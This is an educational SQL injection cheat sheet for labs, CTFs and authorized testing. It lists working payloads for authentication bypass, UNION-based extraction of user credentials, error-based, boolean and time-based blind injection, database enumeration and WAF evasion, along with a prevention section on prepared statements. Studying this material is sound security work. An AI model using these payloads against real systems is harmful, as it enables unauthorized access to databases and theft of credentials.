# SQL Injection (SQLi) Cheat Sheet

## Professional Practical Guide for Learning & Authorized Testing

> This cheat sheet is intended for education, labs, CTFs, and authorized security testing only.

---

# Table of Contents

1. Introduction to SQL Injection
2. How SQL Queries Work
3. Common SQL Injection Types
4. Authentication Bypass
5. UNION-Based SQLi
6. Error-Based SQLi
7. Boolean Blind SQLi
8. Time-Based Blind SQLi
9. Database Enumeration
10. Database-Specific Payloads
11. SQLi in POST Requests
12. SQLi in Cookies & Headers
13. Common WAF Bypass Concepts
14. Secure Coding & Prevention
15. Professional Testing Methodology
16. Useful Tools
17. Quick Payload Reference

---

# 1. Introduction to SQL Injection

SQL Injection (SQLi) is a vulnerability that occurs when user input is inserted directly into SQL queries without proper sanitization or parameterization.

Example vulnerable PHP code:

```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

If user input is not filtered, an attacker may manipulate the SQL query.

---

# 2. How SQL Queries Work

Normal query:

```sql
SELECT * FROM users WHERE username='admin' AND password='123456';
```

If input becomes:

```sql
admin' --
```

The final query becomes:

```sql
SELECT * FROM users WHERE username='admin' -- ' AND password='123456';
```

`--` comments out the remaining query.

---

# 3. Common SQL Injection Types

| Type              | Description                                 |
| ----------------- | ------------------------------------------- |
| UNION-Based       | Combines attacker query with original query |
| Error-Based       | Uses database errors to leak information    |
| Boolean Blind     | Uses TRUE/FALSE responses                   |
| Time-Based Blind  | Uses delays to confirm injections           |
| Out-of-Band       | Uses external channels like DNS             |
| Second-Order SQLi | Payload executes later                      |

---

# 4. Authentication Bypass

## Basic Payloads

```sql
' OR '1'='1
```

```sql
admin' --
```

```sql
' OR 1=1 --
```

## Example

Vulnerable query:

```sql
SELECT * FROM users WHERE username='$user' AND password='$pass';
```

Injected username:

```sql
admin' --
```

Result:

```sql
SELECT * FROM users WHERE username='admin' -- ' AND password='x';
```

---

# 5. UNION-Based SQLi

UNION allows combining results from another SELECT statement.

## Step 1: Find Column Count

```sql
ORDER BY 1 --
ORDER BY 2 --
ORDER BY 3 --
```

Or:

```sql
UNION SELECT NULL --
UNION SELECT NULL,NULL --
UNION SELECT NULL,NULL,NULL --
```

## Step 2: Find Visible Columns

```sql
UNION SELECT 1,2,3 --
```

## Step 3: Extract Data

```sql
UNION SELECT username,password,3 FROM users --
```

---

# 6. Error-Based SQLi

Uses database errors to reveal information.

## MySQL Version Extraction

```sql
' AND extractvalue(1,concat(0x7e,version())) --
```

## Current Database

```sql
' AND updatexml(1,concat(0x7e,database()),1) --
```

## MSSQL

```sql
' AND 1=CONVERT(int,@@version) --
```

---

# 7. Boolean Blind SQLi

Application behavior changes based on TRUE/FALSE conditions.

## TRUE Condition

```sql
' AND 1=1 --
```

## FALSE Condition

```sql
' AND 1=2 --
```

## Extract First Character

```sql
' AND SUBSTRING(database(),1,1)='a' --
```

---

# 8. Time-Based Blind SQLi

Used when no visible errors or output exist.

## MySQL

```sql
' AND SLEEP(5) --
```

## PostgreSQL

```sql
'; SELECT pg_sleep(5) --
```

## MSSQL

```sql
'; WAITFOR DELAY '0:0:5' --
```

## Conditional Delay

```sql
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0) --
```

---

# 9. Database Enumeration

## Current Database

```sql
SELECT database();
```

## List Tables

```sql
SELECT table_name FROM information_schema.tables;
```

## List Columns

```sql
SELECT column_name FROM information_schema.columns WHERE table_name='users';
```

## Extract Data

```sql
SELECT username,password FROM users;
```

---

# 10. Database-Specific Payloads

## MySQL

### Version

```sql
SELECT @@version;
```

### Current User

```sql
SELECT user();
```

### Current Database

```sql
SELECT database();
```

---

## PostgreSQL

### Version

```sql
SELECT version();
```

### Current Database

```sql
SELECT current_database();
```

---

## MSSQL

### Version

```sql
SELECT @@version;
```

### Current User

```sql
SELECT SYSTEM_USER;
```

---

## Oracle

### Version

```sql
SELECT banner FROM v$version;
```

### Current User

```sql
SELECT user FROM dual;
```

---

# 11. SQLi in POST Requests

SQL Injection is not limited to URL parameters.

Example POST request:

```http
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=test
```

---

# 12. SQLi in Cookies & Headers

Some applications store user-controlled values inside:

* Cookies
* User-Agent
* X-Forwarded-For
* Referer

Example:

```http
Cookie: trackingId=' AND SLEEP(5)--
```

---

# 13. Common WAF Bypass Concepts

## Alternative Comments

```sql
/**/
```

Example:

```sql
UNION/**/SELECT/**/1,2,3
```

## Case Manipulation

```sql
uNiOn SeLeCt
```

## URL Encoding

```text
%27 = '
```

## Inline Comments

```sql
SEL/**/ECT
```

---

# 14. Secure Coding & Prevention

## Use Prepared Statements

### Secure PHP Example

```php
$stmt = $pdo->prepare("SELECT * FROM users WHERE username=? AND password=?");
$stmt->execute([$username, $password]);
```

## Input Validation

* Validate data types
* Use allowlists
* Reject unexpected characters

## Least Privilege

Database accounts should only have required permissions.

## Hide Errors

Disable verbose SQL error messages in production.

---

# 15. Professional Testing Methodology

## Step 1: Identify Input Points

Check:

* GET parameters
* POST data
* Cookies
* Headers
* JSON bodies

## Step 2: Test for Errors

Try:

```sql
'
```

Look for:

* SQL syntax errors
* HTTP 500
* Different responses

## Step 3: Determine Injection Type

* Error-Based
* UNION-Based
* Blind
* Time-Based

## Step 4: Enumerate Database

* Database name
* Tables
* Columns
* Sensitive data

## Step 5: Document Findings

Always document:

* Vulnerable parameter
* Request/response
* Impact
* Remediation

---

# 16. Useful Tools

| Tool       | Purpose                |
| ---------- | ---------------------- |
| sqlmap     | Automated SQLi testing |
| Burp Suite | Intercepting requests  |
| OWASP ZAP  | Web security testing   |
| ffuf       | Fuzzing                |
| Nmap NSE   | Database discovery     |

---

# 17. Quick Payload Reference

## Basic Test

```sql
'
```

## Authentication Bypass

```sql
' OR '1'='1
```

## Comment Operators

```sql
--
#
/* */
```

## UNION Test

```sql
UNION SELECT NULL,NULL --
```

## Database Version

```sql
@@version
```

## Current Database

```sql
database()
```

## Sleep Payload

```sql
SLEEP(5)
```

## Boolean Test

```sql
AND 1=1
AND 1=2
```

---

# Final Notes

Professional SQL Injection testing is not about memorizing payloads only.

A strong penetration tester understands:

* SQL query logic
* Database behavior
* Web application flow
* Secure coding principles
* Detection methodology
* Reporting and remediation

The best hackers are the ones who deeply understand systems, not just payload lists.
